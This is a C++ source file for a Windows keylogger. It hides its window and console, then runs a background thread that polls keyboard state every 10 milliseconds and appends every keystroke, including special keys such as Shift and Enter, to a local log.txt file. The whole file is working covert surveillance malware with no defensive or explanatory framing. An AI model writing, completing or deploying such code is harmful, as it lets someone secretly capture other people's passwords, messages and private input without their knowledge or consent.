#include <windows.h>
#include <iostream>

using namespace std;

void HideConsole() {
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE);
}

int Save(int _key, const wchar_t* file);

void LogKeystrokes() {
    char i;
    while (true) {
        Sleep(10);
        for (i = 8; i <= 255; i++) {
            if (GetAsyncKeyState(i) == -32767) {
                Save(i, L"log.txt");
            }
        }
    }
}

int Save(int _key, const wchar_t* file) {
    FILE* OUTPUT_FILE;
    errno_t err = _wfopen_s(&OUTPUT_FILE, file, L"a+");
    if (err != 0 || OUTPUT_FILE == nullptr) return 1;

    switch (_key) {
    case VK_SHIFT: fwprintf(OUTPUT_FILE, L"[SHIFT]"); break;
    case VK_BACK: fwprintf(OUTPUT_FILE, L"[BACKSPACE]"); break;
    case VK_LBUTTON: fwprintf(OUTPUT_FILE, L"[LBUTTON]"); break;
    case VK_RBUTTON: fwprintf(OUTPUT_FILE, L"[RBUTTON]"); break;
    case VK_RETURN: fwprintf(OUTPUT_FILE, L"[ENTER]"); break;
    case VK_TAB: fwprintf(OUTPUT_FILE, L"[TAB]"); break;
    case VK_ESCAPE: fwprintf(OUTPUT_FILE, L"[ESCAPE]"); break;
    case VK_CONTROL: fwprintf(OUTPUT_FILE, L"[Ctrl]"); break;
    case VK_MENU: fwprintf(OUTPUT_FILE, L"[Alt]"); break;
    case VK_CAPITAL: fwprintf(OUTPUT_FILE, L"[CAPS Lock]"); break;
    case VK_SPACE: fwprintf(OUTPUT_FILE, L"[SPACE]"); break;
    default: fwprintf(OUTPUT_FILE, L"%c", _key); break;
    }

    fclose(OUTPUT_FILE);
    return 0;
}

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    switch (uMsg) {
    case WM_DESTROY:
        PostQuitMessage(0);
        return 0;
    }
    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nCmdShow) {
    const wchar_t CLASS_NAME[] = L"HiddenWindowClass";

    WNDCLASS wc = { };

    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = CLASS_NAME;

    RegisterClassW(&wc);

    HWND hwnd = CreateWindowExW(
        0,                              // Optional window styles
        CLASS_NAME,                     // Window class
        L"Hidden Window",               // Window text
        WS_OVERLAPPEDWINDOW,            // Window style

        // Size and position
        CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT,

        NULL,       // Parent window
        NULL,       // Menu
        hInstance,  // Instance handle
        NULL        // Additional application data
    );

    if (hwnd == NULL) {
        return 0;
    }

    ShowWindow(hwnd, SW_HIDE);

    // Hide the console window if any
    FreeConsole();

    // Start logging keystrokes
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)LogKeystrokes, NULL, 0, NULL);

    MSG msg = { };
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return 0;
}
